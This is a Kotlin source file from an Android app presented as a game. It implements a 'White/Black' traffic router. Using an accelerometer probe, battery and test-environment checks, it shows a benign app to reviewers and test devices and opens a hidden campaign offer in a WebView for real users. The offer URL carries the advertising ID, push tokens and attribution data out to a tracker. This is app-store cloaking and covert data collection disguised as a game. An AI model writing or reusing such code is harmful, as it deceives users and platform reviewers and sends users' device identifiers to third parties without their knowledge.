package com.arcticfishtrail.game.integration

import android.os.Handler
import android.os.Looper
import com.arcticfishtrail.game.BuildConfig
import java.util.concurrent.Executors

/**
 * Decides White vs Black WITHOUT touching the network. The only request that reaches the
 * tracker is the WebView opening the campaign link - that single click is the install's
 * click, and [OfferWebViewClient] turns the tracker's answer into the verdict.
 */
object TrafficRouter {

    private val executor = Executors.newSingleThreadExecutor()
    private val mainHandler = Handler(Looper.getMainLooper())

    fun route(onResult: (RouteDecision) -> Unit) {
        // A pinned White answers instantly, without building a URL or waiting on signals.
        if (IntegrationStorage.isWhiteLocked) {
            deliver(RouteDecision.White, onResult)
            return
        }
        // A fresh cached address is reused for 24h: repeated launches cost one click, not one each.
        IntegrationStorage.freshOfferUrl()?.let {
            deliver(RouteDecision.Black(it, fromCache = true), onResult)
            return
        }
        if (BuildConfig.OFFER_BASE_URL.isBlank()) {
            // A build with no campaign link shows White but pins NOTHING - a later build
            // with a real URL must still get its chance.
            deliver(RouteDecision.White, onResult)
            return
        }

        // Building the URL waits out the accelerometer window and the token latch, so it
        // runs off the main thread.
        executor.execute {
            val url = buildOfferUrl()
            deliver(
                if (url.isBlank()) RouteDecision.White else RouteDecision.Black(url, fromCache = false),
                onResult
            )
        }
    }

    /** Blocking (device signals, token). Only ever called from the background executor. */
    fun buildOfferUrl(): String = OfferUrlBuilder.build(
        baseUrl = BuildConfig.OFFER_BASE_URL,
        // The whole map. Hand-picking "the keys we need" is the classic regression: it
        // compiles, it runs, and the network quietly loses parameters.
        attribution = IntegrationStorage.attributionParams,
        adid = IntegrationStorage.adid,
        extras = deviceSignals(),
        sub1InPath = BuildConfig.OFFER_ROUTING == "prily"
    )

    /**
     * A pushed deep link is opened as sent; only the push identifiers are appended, so the
     * push service can tie the open back to this install. Inserted before any fragment.
     * Called from a background thread (it waits on the token latch).
     */
    fun appendPushParams(url: String): String {
        if (url.isBlank()) return url
        val hash = url.indexOf('#')
        val base = if (hash >= 0) url.substring(0, hash) else url
        val fragment = if (hash >= 0) url.substring(hash) else ""
        val query = CampaignParser.toQuery(
            linkedMapOf(
                "push_token" to PushManager.awaitToken(),
                "push_id" to IntegrationStorage.pushId
            )
        )
        val separator = if (base.contains('?')) '&' else '?'
        return base + separator + query + fragment
    }

    /**
     * All of them go out on every request, including with an empty value: the offer side
     * has to tell a real negative answer from a signal that never arrived. There is
     * deliberately no "skip when blank" branch.
     */
    private fun deviceSignals(): Map<String, String> = linkedMapOf(
        "sub12" to DeviceSignals.battery,
        "sub13" to AccelerometerProbe.await(),
        "sub14" to DeviceSignals.isTestEnvironment.toString(),
        // GAID: the primary postback-matching key, so it rides in every click, blank included.
        "gps_adid" to GaidProbe.await(),
        "push_token" to PushManager.awaitToken(),
        "push_id" to IntegrationStorage.pushId
    )

    private fun deliver(decision: RouteDecision, onResult: (RouteDecision) -> Unit) {
        mainHandler.post { onResult(decision) }
    }
}
